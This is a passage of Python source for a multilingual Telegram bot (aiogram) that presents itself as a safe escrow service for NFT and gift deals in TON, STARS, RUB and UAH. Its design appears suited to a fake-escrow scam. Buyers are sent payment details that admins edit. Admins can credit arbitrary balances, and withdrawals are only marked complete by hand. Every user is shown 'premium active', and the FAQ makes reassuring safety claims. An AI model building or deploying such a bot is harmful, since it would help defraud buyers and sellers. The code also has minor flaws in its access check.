        "admin_panel": "لوحة التحكم",
        "choose_action": "اختر إجراء",
        "describe_product": "وصف المنتج أو الخدمة التي تبيعها",
        "example_product": "مثال: هدية NFT Telegram Premium",
        "choose_currency": "اختر عملة الصفقة",
        "enter_amount": "أدخل مبلغ الصفقة",
        "enter_buyer": "أدخل اسم مستخدم المشتري في تليغرام",
        "buyer_username_example": "مثال: john_doe",
        "only_this_user": "هذا المستخدم فقط يمكنه الوصول إلى الصفقة",
        "deal_created": "تم إنشاء الصفقة",
        "send_link_to_buyer": "أرسل هذا الرابط إلى المشتري",
        "your_balance": "رصيدك",
        "withdraw_funds": "سحب الأموال",
        "main_menu": "القائمة الرئيسية",
        "no_deals": "ليس لديك صفقات",
        "your_deals": "صفقاتك",
        "premium_status": "حالة البريميوم",
        "premium_privileges": "الامتيازات",
        "premium_1": "دعم ذو أولوية 24/7",
        "premium_2": "عمولة مخفضة (0%)",
        "premium_3": "وصول مبكر إلى الميزات الجديدة",
        "premium_4": "مكافآت NFT حصرية",
        "premium_active": "حالتك: نشط",
        "faq_q1": "كيف أبدأ صفقة؟",
        "faq_a1": "اضغط «إنشاء صفقة» واتبع التعليمات.",
        "faq_q2": "ما هي العملات المتاحة؟",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "كيف أتلقى الدفع؟",
        "faq_a3": "بعد تأكيد المشتري، تضاف الأموال إلى الرصيد.",
        "faq_q4": "كيف أسحب الأموال؟",
        "faq_a4": "«رصيدي» → اختر عملة → أدخل التفاصيل",
        "faq_q5": "هل هذا آمن؟",
        "faq_a5": "نعم! المدقق يتحقق من جميع المدفوعات.",
        "faq_q6": "كم يستغرق السحب؟",
        "faq_a6": "1-5 دقائق بعد التأكيد.",
        "faq_q7": "كيف اتصل بالدعم؟",
        "faq_a7": "اضغط زر «القناة» أو أرسل رسالة للدعم @p2psupporttonbot",
        "deal_not_found": "الصفقة غير موجودة أو مكتملة بالفعل",
        "access_denied": "الوصول مرفوض",
        "invalid_amount": "أدخل رقماً موجباً",
        "payment_confirmed": "تم تأكيد الدفع",
        "seller_confirmed": "لقد أكدت تسليم المنتج",
        "buyer_confirmed": "لقد أكدت استلام المنتج",
        "deal_completed": "الصفقة مكتملة",
        "insufficient_balance": "رصيد غير كافٍ",
        "choose_payment_method": "اختر طريقة الدفع",
        "pay_by_rekvisits": "الدفع حسب التفاصيل",
        "pay_by_balance": "الدفع من الرصيد",
        "status_waiting": "انتظار الدفع",
        "status_paid": "تم الدفع",
        "status_awaiting": "انتظار التأكيد",
        "status_completed": "مكتملة",
        "select_language": "اختر اللغة",
        "welcome": "مرحباً",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nاختر لغتك للمتابعة:",
        "product": "المنتج",
        "amount": "المبلغ",
        "seller": "البائع",
        "buyer": "المشتري",
        "deal": "الصفقة",
        "waiting_for_delivery": "انتظار التسليم",
        "seller_delivered": "البائع سلم المنتج",
        "confirm_receipt": "تأكيد الاستلام",
        "contact_support": "اتصل بالدعم",
        "balance_topped_up": "تم شحن رصيدك",
        "withdraw_request_created": "تم إنشاء طلب السحب",
        "withdraw_pending": "يرجى الانتظار 1-5 دقائق",
        "withdraw_completed": "تم تأكيد السحب",
        "no_active_requests": "لا توجد طلبات نشطة",
        "admin_rights": "صلاحيات غير كافية",
        "cmd_usage": "الاستخدام",
        "request_not_found": "الطلب غير موجود",
        "request_already_processed": "الطلب تمت معالجته بالفعل",
        "photo_updated": "تم تحديث الصورة",
        "send_photo": "أرسل صورة",
        "user_not_found": "المستخدم غير موجود",
        "balance_added": "تم إضافة الرصيد",
        "rekvisits_updated": "تم تحديث تفاصيل الدفع",
        "admin_added": "تم إضافة المدقق",
        "admin_removed": "تم إزالة المدقق",
        "cannot_remove_master": "لا يمكن إزالة المدقق الرئيسي",
        "admin_list": "قائمة المدققين",
        "no_deals_total": "لا توجد صفقات",
        "all_deals_title": "جميع الصفقات",
        "payment_details": "تفاصيل الدفع",
        "edit_rekvisits_title": "تحرير تفاصيل الدفع",
        "enter_new_text": "أدخل نصاً جديداً",
        "use_amount_placeholder": "استخدم {amount} كعنصر نائب للمبلغ",
        "enter_user_id": "أدخل معرف المستخدم في تليغرام",
        "enter_withdraw_details": "أدخل تفاصيل السحب",
        "enter_withdraw_username": "أدخل اسم المستخدم الخاص بك في تليغرام",
        "deal_link_text": "رابط المشتري",
        "copy_link": "انسخ الرابط",
        "after_payment_notify": "ستتلقى إشعاراً بعد الدفع",
        "payment_verified": "تم التحقق من الدفع",
        "funds_deducted": "تم خصم الأموال",
        "product_delivered": "تم تسليم المنتج",
        "deal_completed_msg": "شكراً لثقتك",
        "funds_added_to_balance": "تم إضافة الأموال إلى الرصيد",
        "for_user": "لـ",
        "need": "مطلوب",
        "available": "متاح",
        "currency": "العملة",
        "created": "تم الإنشاء",
        "status": "الحالة",
        "check_status": "تحقق من الحالة",
        "example": "مثال",
        "subscribe": "اشترك",
        "channel_content": "في القناة:\n• أخبار وتحديثات\n• أدلة مفيدة\n• هدايا ومكافآت\n• أسعار الصرف الحالية",
        "click_subscribe": "انقر على الرابط واشترك",
        "thank_you": "شكراً لوجودكم معنا"
    }
}


def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)


def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    if uid in user_language:
        return user_language[uid]
    return None


def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_user_language(user_language)


def has_language(user_id: int) -> bool:
    return str(user_id) in user_language


# ========== FSM ==========
class DealStates(StatesGroup):
    waiting_for_product = State()
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_buyer_username = State()


class RekvStates(StatesGroup):
    waiting_for_rekv_type = State()
    waiting_for_rekv_text = State()


class PhotoStates(StatesGroup):
    waiting_for_photo = State()


class WithdrawStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_details = State()


class AdminAddBalanceState(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_currency = State()
    waiting_for_amount = State()


# ========== КЛАВИАТУРЫ ==========
def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([premium_button(lang_name, f"set_lang_{lang_code}", "🌐")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    buttons = [
        [
            premium_button(get_text(lang, "create_deal"), "menu_create_deal", "📱"),
            premium_button(get_text(lang, "my_balance"), "menu_my_balance", "💰"),
        ],
        [
            premium_button(get_text(lang, "my_deals"), "menu_my_deals", "📊"),
            premium_button(get_text(lang, "premium"), "menu_premium", "⭐️"),
        ],
        [
            premium_button(get_text(lang, "faq"), "menu_faq", "❓"),
            premium_button(get_text(lang, "channel"), "menu_channel", "🔥"),
        ],
        [
            premium_button(get_text(lang, "select_language"), "select_language", "🌐"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            premium_button(get_text(lang, "admin_panel"), "menu_admin_panel", "👑")
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def currency_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "curr_TON", "💎")],
        [premium_button("STARS", "curr_STARS", "⭐️")],
        [premium_button("RUB", "curr_RUB", "💰")],
        [premium_button("UAH", "curr_UAH", "🌐")]
    ])


def withdraw_currency_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "withdraw_TON", "💎")],
        [premium_button("STARS", "withdraw_STARS", "⭐️")],
        [premium_button("RUB", "withdraw_RUB", "💰")],
        [premium_button("UAH", "withdraw_UAH", "🌐")]
    ])


def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "photo_updated"), "change_photo", "📷")],
        [premium_button(get_text(lang, "balance_added"), "admin_add_balance", "💰")],
        [premium_button(get_text(lang, "admin_added"), "add_admin", "🐶")],
        [premium_button(get_text(lang, "admin_removed"), "remove_admin", "🐱")],
        [premium_button(get_text(lang, "admin_list"), "list_admins", "📊")],
        [premium_button(get_text(lang, "edit_rekvisits_title"), "edit_rekvisits", "💎")],
        [premium_button(get_text(lang, "all_deals_title"), "all_deals", "🏆")],
        [premium_button(get_text(lang, "withdraw_funds"), "withdraw_requests", "💲")],
        [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
    ])


def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "edit_ton", "💎")],
        [premium_button("STARS", "edit_stars", "⭐️")],
        [premium_button("RUB", "edit_rub", "💰")],
        [premium_button("UAH", "edit_uah", "🌐")],
        [premium_button(get_text(lang, "main_menu"), "back_to_admin", "◀️")]
    ])


def seller_confirm_keyboard(deal_id, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "product_delivered"), f"seller_done_{deal_id}", "📦")]
    ])


def buyer_confirm_keyboard(deal_id, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "confirm_receipt"), f"buyer_confirm_{deal_id}", "👍")],
        [premium_button(get_text(lang, "contact_support"), f"support_{deal_id}", "❓")]
    ])


def buyer_pending_keyboard(deal_id, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "waiting_for_delivery"), "noop", "⏳")],
        [premium_button(get_text(lang, "contact_support"), f"support_{deal_id}", "❓")]
    ])


def payment_method_keyboard(deal_id, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "pay_by_rekvisits"), f"pay_rekvisits_{deal_id}", "💳")],
        [premium_button(get_text(lang, "pay_by_balance"), f"pay_balance_{deal_id}", "💰")]
    ])


def back_to_main_button(user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
    ])


# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id in admins


async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass


def get_balance(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_balance(balance)
    return balance[uid]


def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_balance(balance)


def get_rekvisits_text(currency, amount, user_id: int):
    curr_key = currency.lower()
    if curr_key in rekvisits:
        return rekvisits[curr_key].format(amount=amount)
    return f"Payment details: {amount} {currency}"


async def safe_edit(callback: types.CallbackQuery, text: str, reply_markup=None, **kwargs):
    try:
        if callback.message.text or callback.message.caption:
            await callback.message.edit_text(text, reply_markup=reply_markup, **kwargs)
        else:
            await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
    except Exception as e:
        print(f"Error: {e}")
        try:
            await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
        except:
            pass


async def send_welcome_message(message: types.Message, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    
    welcome_text = f"""{pm('🔥')} {get_text(lang, 'bot_name')} {pm('🔥')}

{pm('🏴‍☠️')} {get_text(lang, 'bot_desc')}
• {pm('🤝')} {get_text(lang, 'feature1')}
• {pm('💎')} {get_text(lang, 'feature2')}
• {pm('🔒')} {get_text(lang, 'feature3')}
• {pm('👑')} {get_text(lang, 'feature4')}

{pm('📊')} {get_text(lang, 'how_it_works')}:
{pm('1️⃣')} {get_text(lang, 'step1')}
{pm('2️⃣')} {get_text(lang, 'step2')}
{pm('3️⃣')} {get_text(lang, 'step3')}
{pm('4️⃣')} {get_text(lang, 'step4')}
{pm('5️⃣')} {get_text(lang, 'step5')}
{pm('6️⃣')} {get_text(lang, 'step6')}
{pm('7️⃣')} {get_text(lang, 'step7')}

{pm('📢')} {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
{pm('🆘')} {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

{pm('🔥')} {get_text(lang, 'start_now')} {pm('🚀')}"""

    if start_photo.get("file_id"):
        try:
            await message.answer_photo(
                photo=start_photo["file_id"],
                caption=welcome_text,
                reply_markup=main_menu_keyboard(user_id)
            )
            return
        except:
            pass

    await message.answer(welcome_text, reply_markup=main_menu_keyboard(user_id))


async def send_language_selection(message: types.Message):
    text = f"{pm('🌐')} {get_text('ru', 'choose_language_prompt')}"
    await message.answer(text, reply_markup=language_keyboard())


async def send_buyer_pending_message(deal_id: str):
    deal = deals[deal_id]
    buyer_id = deal.get("buyer_id", 0)
    buyer_lang = get_user_language(buyer_id)
    if buyer_lang is None:
        buyer_lang = "ru"
    keyboard = buyer_pending_keyboard(deal_id, buyer_id)

    text = f"{pm('✈️')} {get_text(buyer_lang, 'deal')} #{deal_id} {get_text(buyer_lang, 'status_paid')}!\n\n" \
           f"{pm('📦')} {get_text(buyer_lang, 'product')}: {deal['product']}\n" \
           f"{pm('💰')} {get_text(buyer_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} {get_text(buyer_lang, 'seller')}: @{deal['seller_username']}\n\n" \
           f"{pm('⏳')} {get_text(buyer_lang, 'waiting_for_delivery')}\n\n" \
           f"{pm('🔥')} {get_text(buyer_lang, 'premium_1')}"

    try:
        msg = await bot.send_message(
            deal["buyer_username"],
            text,
            reply_markup=keyboard
        )
        deal["buyer_message_id"] = msg.message_id
        deal["buyer_chat_id"] = msg.chat.id
        save_deals(deals)
    except Exception as e:
        print(f"Error: {e}")


# ========== ВЫБОР ЯЗЫКА ==========
@dp.callback_query(lambda c: c.data == "select_language")
async def select_language_callback(callback: types.CallbackQuery):
    text = f"{pm('🌐')} {get_text('ru', 'choose_language_prompt')}"
    await safe_edit(callback, text, reply_markup=language_keyboard())


@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language_callback(callback: types.CallbackQuery):
    lang_code = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang_code)
    await callback.answer(f"{get_text(lang_code, 'welcome')}")
    await send_welcome_message(callback.message, callback.from_user.id)


# ========== ОБРАБОТЧИКИ ГЛАВНОГО МЕНЮ ==========
@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"{pm('🔥')} {get_text(lang, 'bot_name')} — {get_text(lang, 'bot_desc')} {pm('🔥')}\n\n{get_text(lang, 'choose_action')}:"
    await safe_edit(callback, text, reply_markup=main_menu_keyboard(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_create_deal")
async def menu_create_deal(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"{pm('✏️')} {get_text(lang, 'describe_product')}:\n\n{get_text(lang, 'example_product')}"
    await safe_edit(callback, text)
    await state.set_state(DealStates.waiting_for_product)


@dp.callback_query(lambda c: c.data == "menu_my_balance")
async def menu_my_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    user_balance = get_balance(callback.from_user.id)
    text = f"""{pm('💰')} {get_text(lang, 'your_balance')} {pm('💰')}

{pm('💎')} TON: {user_balance['ton']}
{pm('⭐️')} STARS: {user_balance['stars']}
{pm('💰')} RUB: {user_balance['rub']}
{pm('🌐')} UAH: {user_balance['uah']}

{pm('⬇️')} {get_text(lang, 'withdraw_funds')} {pm('⬇️')}"""

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "withdraw_funds"), "start_withdraw", "💲")],
        [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
    ])
    await safe_edit(callback, text, reply_markup=keyboard)


@dp.callback_query(lambda c: c.data == "menu_my_deals")
async def menu_my_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))

    if not user_deals:
        text = f"{pm('📭')} {get_text(lang, 'no_deals')}"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
    else:
        text = f"{pm('📊')} {get_text(lang, 'your_deals')}\n\n"
        for d_id, d in user_deals[-10:]:
            status_emoji = {
                "waiting_payment": pm('⏳'),
                "paid": pm('✅'),
                "awaiting_confirmation": pm('📦'),
                "completed": pm('🎁')
            }.get(d['status'], pm('❓'))
            status_text = {
                "waiting_payment": get_text(lang, 'status_waiting'),
                "paid": get_text(lang, 'status_paid'),
                "awaiting_confirmation": get_text(lang, 'status_awaiting'),
                "completed": get_text(lang, 'status_completed')
            }.get(d['status'], '?')
            text += f"{d_id} | {status_emoji} {status_text} | {d['amount']} {d['currency']}\n   → {d['product'][:30]}\n\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_premium")
async def menu_premium(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"""{pm('🔥')} {get_text(lang, 'premium_status')} {pm('🔥')}

{pm('💎')} {get_text(lang, 'premium_privileges')}:
• {pm('✅')} {get_text(lang, 'premium_1')}
• {pm('📉')} {get_text(lang, 'premium_2')}
• {pm('🚀')} {get_text(lang, 'premium_3')}
• {pm('🎁')} {get_text(lang, 'premium_4')}

{pm('⭐️')} {get_text(lang, 'premium_active')}

{pm('🚀')} {get_text(lang, 'thank_you')}"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_faq")
async def menu_faq(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"""{pm('❓')} {get_text(lang, 'faq')}

{pm('1️⃣')} {get_text(lang, 'faq_q1')}
{get_text(lang, 'faq_a1')}

{pm('2️⃣')} {get_text(lang, 'faq_q2')}
{get_text(lang, 'faq_a2')}

{pm('3️⃣')} {get_text(lang, 'faq_q3')}
{get_text(lang, 'faq_a3')}

{pm('4️⃣')} {get_text(lang, 'faq_q4')}
{get_text(lang, 'faq_a4')}

{pm('5️⃣')} {get_text(lang, 'faq_q5')}
{get_text(lang, 'faq_a5')}

{pm('6️⃣')} {get_text(lang, 'faq_q6')}
{get_text(lang, 'faq_a6')}

{pm('7️⃣')} {get_text(lang, 'faq_q7')}
{get_text(lang, 'faq_a7')}"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"""{pm('📢')} {get_text(lang, 'our_channel')}

{pm('🔥')} {get_text(lang, 'subscribe')}:
{CHANNEL_LINK}

{pm('💎')} {get_text(lang, 'channel_content')}

{pm('🚀')} {get_text(lang, 'click_subscribe')}"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id), disable_web_page_preview=False)


@dp.callback_query(lambda c: c.data == "menu_admin_panel")
async def menu_admin_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        lang = get_user_language(callback.from_user.id)
        if lang is None:
            lang = "ru"
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"{pm('👑')} {get_text(lang, 'admin_panel')}\n\n{get_text(lang, 'choose_action')}:"
    await safe_edit(callback, text, reply_markup=admin_panel_keyboard(callback.from_user.id))


# ========== СТАРТ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверяем, есть ли у пользователя выбранный язык
    if not has_language(message.from_user.id):
        await send_language_selection(message)
        return
    
    # Обработка сделки по ссылке
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        lang = get_user_language(message.from_user.id)
        if lang is None:
            lang = "ru"
            
        if deal_id not in deals:
            await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
            return

        deal = deals[deal_id]
        deal["buyer_id"] = message.from_user.id
        save_deals(deals)

        if message.from_user.username != deal["buyer_username"]:
            await message.answer(
                f"{pm('❌')} {get_text(lang, 'access_denied')}!\n\n{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}\n\n{get_text(lang, 'support_contact')}: @dealtonkeeper_bot"
            )
            await log_to_master(
                f"⚠️ UNAUTHORIZED ACCESS\nDeal: #{deal_id}\nAttempted by: @{message.from_user.username}\nExpected: @{deal['buyer_username']}")
            return

        if deal["status"] != "waiting_payment":
            await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
            return

        text = f"{pm('✈️')} {get_text(lang, 'deal')} #{deal_id}\n\n" \
               f"{pm('📦')} {get_text(lang, 'product')}: {deal['product']}\n" \
               f"{pm('💰')} {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
               f"{pm('👤')} {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n" \
               f"{pm('⬇️')} {get_text(lang, 'choose_payment_method')} {pm('⬇️')}"
        
        await message.answer(
            text,
            reply_markup=payment_method_keyboard(deal_id, message.from_user.id)
        )

        await log_to_master(
            f"👁 BUYER ENTERED DEAL\n"
            f"Deal: #{deal_id}\n"
            f"Buyer: {message.from_user.full_name} (@{message.from_user.username})"
        )
        return

    await send_welcome_message(message, message.from_user.id)


# ========== ВЫВОД ==========
@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    user_balance = get_balance(callback.from_user.id)
    has_money = any(v > 0 for v in user_balance.values())

    if not has_money:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'insufficient_balance')}", show_alert=True)
        return

    text = f"{pm('💰')} {get_text(lang, 'choose_currency')}:"
    await safe_edit(callback, text, reply_markup=withdraw_currency_keyboard(callback.from_user.id))
    await state.set_state(WithdrawStates.waiting_for_currency)


@dp.callback_query(lambda c: c.data.startswith("withdraw_"))
async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    currency = callback.data.split("_")[1]
    user_balance = get_balance(callback.from_user.id)
    curr_key = currency.lower()

    if user_balance.get(curr_key, 0) <= 0:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'insufficient_balance')}", show_alert=True)
        return

    await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])

    if currency == "STARS":
        text = f"{pm('⭐️')} {get_text(lang, 'enter_withdraw_username')}:"
    else:
        text = f"{pm('💲')} {get_text(lang, 'enter_withdraw_details')} {currency}:"

    await safe_edit(callback, text)
    await state.set_state(WithdrawStates.waiting_for_details)


@dp.message(WithdrawStates.waiting_for_details)
async def withdraw_details(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    data = await state.get_data()
    currency = data["withdraw_currency"]
    amount = data["withdraw_amount"]
    details = message.text.strip()

    request_id = str(uuid.uuid4())[:8]
    withdraw_requests[request_id] = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "full_name": message.from_user.full_name,
        "currency": currency,
        "amount": amount,
        "details": details,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_withdraw_requests(withdraw_requests)

    await bot.send_message(
        MASTER_ADMIN_ID,
        f"💲 NEW WITHDRAWAL REQUEST #{request_id}\n\n"
        f"👤 User: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"💰 Amount: {amount} {currency}\n"
        f"📝 Details: {details}\n\n"
        f"TO CONFIRM: /confirm_withdraw {request_id}"
    )

    text = f"{pm('✅')} {get_text(lang, 'withdraw_request_created')} #{request_id}!\n\n" \
           f"{pm('💰')} {get_text(lang, 'amount')}: {amount} {currency}\n" \
           f"{pm('⏳')} {get_text(lang, 'withdraw_pending')}.\n\n" \
           f"{get_text(lang, 'check_status')}: /withdraw_status {request_id}"
    
    await message.answer(
        text,
        reply_markup=back_to_main_button(message.from_user.id)
    )

    await log_to_master(f"💸 New withdrawal request: #{request_id} from @{message.from_user.username}")
    await state.clear()


@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} {get_text(lang, 'admin_rights')}")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} {get_text(lang, 'cmd_usage')}: /confirm_withdraw [ID]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"{pm('❌')} {get_text(lang, 'request_not_found')}")
        return

    req = withdraw_requests[request_id]
    if req["status"] != "pending":
        await message.answer(f"{pm('❌')} {get_text(lang, 'request_already_processed')}: {req['status']}")
        return

    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    req["completed_by"] = message.from_user.id
    save_withdraw_requests(withdraw_requests)

    user_balance = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if user_balance.get(curr_key, 0) >= req["amount"]:
        user_balance[curr_key] -= req["amount"]
        save_balance(balance)

    user_lang = get_user_language(req["user_id"])
    if user_lang is None:
        user_lang = "ru"
        
    try:
        await bot.send_message(
            req["user_id"],
            f"{pm('✅')} {get_text(user_lang, 'withdraw_completed')}!\n\n"
            f"{pm('💰')} {get_text(user_lang, 'amount')}: {req['amount']} {req['currency']}\n"
            f"{pm('📝')} {get_text(user_lang, 'payment_details')}: {req['details']}"
        )
    except:
        pass

    await message.answer(f"{pm('✅')} {get_text(lang, 'withdraw_completed')} #{request_id}! {get_text(lang, 'funds_deducted')}")
    await log_to_master(f"✅ Withdrawal #{request_id} confirmed by admin @{message.from_user.username}")


@dp.message(Command("withdraw_status"))
async def withdraw_status(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
        
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} {get_text(lang, 'cmd_usage')}: /withdraw_status [ID]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"{pm('❌')} {get_text(lang, 'request_not_found')}")
        return

    req = withdraw_requests[request_id]
    status_text = {
        "pending": f"{pm('⏳')} {get_text(lang, 'status_waiting')}",
        "completed": f"{pm('✅')} {get_text(lang, 'status_completed')}"
    }.get(req["status"], req["status"])

    await message.answer(
        f"{pm('📊')} {get_text(lang, 'withdraw_funds')} #{request_id}\n\n"
        f"{pm('💰')} {get_text(lang, 'amount')}: {req['amount']} {req['currency']}\n"
        f"📅 {get_text(lang, 'created')}: {req['created_at'][:19]}\n"
        f"📊 {get_text(lang, 'status')}: {status_text}"
    )


# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.message(DealStates.waiting_for_product)
async def get_product(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    await state.update_data(product=message.text.strip())
    await message.answer(f"{pm('💱')} {get_text(lang, 'choose_currency')}:", reply_markup=currency_keyboard(message.from_user.id))
    await state.set_state(DealStates.waiting_for_currency)


@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    text = f"{pm('💰')} {get_text(lang, 'enter_amount')}:\n{get_text(lang, 'currency')}: {currency}"
    await safe_edit(callback, text)
    await state.set_state(DealStates.waiting_for_amount)


@dp.message(DealStates.waiting_for_amount)
async def get_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        text = f"{pm('👤')} {get_text(lang, 'enter_buyer')}:\n\n{get_text(lang, 'buyer_username_example')}\n\n{pm('❗️')} {get_text(lang, 'only_this_user')}"
        await message.answer(text)
        await state.set_state(DealStates.waiting_for_buyer_username)
    except:
        await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")


@dp.message(DealStates.waiting_for_buyer_username)
async def get_buyer(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username,
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
